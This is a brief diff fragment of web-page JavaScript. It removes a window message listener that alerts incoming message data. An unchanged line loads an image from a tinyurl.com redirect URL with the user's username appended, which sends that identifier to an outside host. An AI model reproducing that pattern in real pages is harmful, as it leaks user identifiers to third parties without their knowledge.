@@ -11,12 +11,6 @@
     document.querySelectorAll(".autho")[1].src="https://tinyurl.com/redirect.php?num=systemuser"+username;
     
   }
-  var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
-  var eventer = window[eventMethod];
-  var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
-  eventer(messageEvent,function(e) {
-      alert(e.data);
-  });
   function blockSpecialChar(e){
       var k;
       document.all ? k = e.keyCode : k = e.which;
